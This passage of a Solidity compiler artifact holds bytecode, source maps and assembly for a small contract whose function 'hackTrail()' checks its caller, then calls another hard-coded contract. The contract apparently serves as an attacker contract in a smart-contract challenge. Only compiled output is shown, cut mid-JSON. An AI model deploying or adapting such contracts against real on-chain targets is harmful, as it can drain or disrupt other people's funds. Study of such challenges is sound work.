JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x29D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x279 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x2D7 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x2BC JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2F7 DUP3 PUSH2 0x2A3 JUMP JUMPDEST PUSH2 0x301 DUP2 DUP6 PUSH2 0x2AE JUMP JUMPDEST SWAP4 POP PUSH2 0x311 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x2B9 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x329 DUP3 DUP5 PUSH2 0x2EC JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6C6F6C20686F772064696420796F75206576656E2066696E6420746869733F00 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x37B PUSH1 0x1F DUP4 PUSH2 0x334 JUMP JUMPDEST SWAP2 POP PUSH2 0x386 DUP3 PUSH2 0x345 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x3AA DUP2 PUSH2 0x36E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3DC DUP3 PUSH2 0x3B1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3EC DUP2 PUSH2 0x3D1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x407 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP11 0xAD 0xA7 0xC5 0xC1 BYTE LOG1 GASLIMIT DUP6 0xF8 PUSH17 0x6B7D1D63D95CCD8CF688145A4E5826D0CF SLOAD JUMPDEST DUP16 0xF7 PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
							"sourceMap": "808:701:0:-:0;;;;;;;;;;;;;;;;;;;;;;;1410:12;880:42;1427:27;;1473:22;1455:42;;;;;;;;:::i;:::-;;;;;;;;;;;;;1427:71;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1409:89;;;1398:108;808:701;;;;;1097:266;;;;;;;;;;;;;:::i;:::-;;;990:42;968:65;;:10;:65;;;960:109;;;;;;;;;;;;:::i;:::-;;;;;;;;;1147:20:::1;880:42;1147:48;;1206:9;:20;;;1235:42;1206:73;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;::::0;::::1;;;;;;;;;1311:42;1290:65;;;7:149:1::0;43:7;83:66;76:5;72:78;61:89;;7:149;;;:::o;162:115::-;247:23;264:5;247:23;:::i;:::-;242:3;235:36;162:115;;:::o;283:218::-;374:4;412:2;401:9;397:18;389:26;;425:69;491:1;480:9;476:17;467:6;425:69;:::i;:::-;283:218;;;;:::o;507:98::-;558:6;592:5;586:12;576:22;;507:98;;;:::o;611:147::-;712:11;749:3;734:18;;611:147;;;;:::o;764:307::-;832:1;842:113;856:6;853:1;850:13;842:113;;;941:1;936:3;932:11;926:18;922:1;917:3;913:11;906:39;878:2;875:1;871:10;866:15;;842:113;;;973:6;970:1;967:13;964:101;;;1053:1;1044:6;1039:3;1035:16;1028:27;964:101;813:258;764:307;;;:::o;1077:373::-;1181:3;1209:38;1241:5;1209:38;:::i;:::-;1263:88;1344:6;1339:3;1263:88;:::i;:::-;1256:95;;1360:52;1405:6;1400:3;1393:4;1386:5;1382:16;1360:52;:::i;:::-;1437:6;1432:3;1428:16;1421:23;;1185:265;1077:373;;;;:::o;1456:271::-;1586:3;1608:93;1697:3;1688:6;1608:93;:::i;:::-;1601:100;;1718:3;1711:10;;1456:271;;;;:::o;1733:169::-;1817:11;1851:6;1846:3;1839:19;1891:4;1886:3;1882:14;1867:29;;1733:169;;;;:::o;1908:181::-;2048:33;2044:1;2036:6;2032:14;2025:57;1908:181;:::o;2095:366::-;2237:3;2258:67;2322:2;2317:3;2258:67;:::i;:::-;2251:74;;2334:93;2423:3;2334:93;:::i;:::-;2452:2;2447:3;2443:12;2436:19;;2095:366;;;:::o;2467:419::-;2633:4;2671:2;2660:9;2656:18;2648:26;;2720:9;2714:4;2710:20;2706:1;2695:9;2691:17;2684:47;2748:131;2874:4;2748:131;:::i;:::-;2740:139;;2467:419;;;:::o;2892:126::-;2929:7;2969:42;2962:5;2958:54;2947:65;;2892:126;;;:::o;3024:96::-;3061:7;3090:24;3108:5;3090:24;:::i;:::-;3079:35;;3024:96;;;:::o;3126:118::-;3213:24;3231:5;3213:24;:::i;:::-;3208:3;3201:37;3126:118;;:::o;3250:222::-;3343:4;3381:2;3370:9;3366:18;3358:26;;3394:71;3462:1;3451:9;3447:17;3438:6;3394:71;:::i;:::-;3250:222;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "218200",
								"executionCost": "263",
								"totalCost": "218463"
							},
							"external": {
								"hackTrail()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 808,
									"end": 1509,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212208aada7c5c11aa14585f8706b7d1d63d95ccd8cf688145a4e5826d0cf545b8ff764736f6c634300080a0033",
									".code": [
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH",
											"source": 0,
											"value": "157BCA60"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1410,
											"end": 1422,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 880,
											"end": 922,
											"name": "PUSH",
											"source": 0,
											"value": "CD6A42782D230D7C13A74DDEC5DD140E55499DF9"
										},
										{
											"begin": 1427,
											"end": 1454,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1427,
											"end": 1454,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1473,
											"end": 1495,
											"name": "PUSH",
											"source": 0,
											"value": "4C228CC7776FF09193DDDEAA40B26EBD5D18D89E2B6E01ADF9E9D8BFC40DCB16"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1455,
											"end": 1497,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1427,
											"end": 1498,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1409,
											"end": 1498,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1409,
											"end": 1498,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1409,
											"end": 1498,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1398,
											"end": 1506,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 808,
											"end": 1509,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 1097,
											"end": 1363,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 990,
											"end": 1032,
											"name": "PUSH",
											"source": 0,
											"value": "798349E06C67272465123B91BD88C5D19B8C7878"
										},
										{
											"begin": 968,
											"end": 1033,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 968,
											"end": 1033,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 968,
											"end": 978,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 968,
											"end": 1033,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 968,
											"end": 1033,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 968,
											"end": 1033,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 960,
											"end": 1069,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1147,
											"end": 1167,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 880,
											"end": 922,
											"name": "PUSH",
											"source": 0,
											"value": "CD6A42782D230D7C13A74DDEC5DD140E55499DF9"
										},
										{
											"begin": 1147,
											"end": 1195,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1147,
											"end": 1195,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1215,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1226,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1206,
											"end": 1226,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1226,
											"name": "PUSH",
											"source": 0,
											"value": "548853A0"
										},
										{
											"begin": 1235,
											"end": 1277,
											"name": "PUSH",
											"source": 0,
											"value": "798349E06C67272465123B91BD88C5D19B8C7878"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 1206,
											"end": 1279,
											"name": "DUP1",
											"source": 0
										},
										{
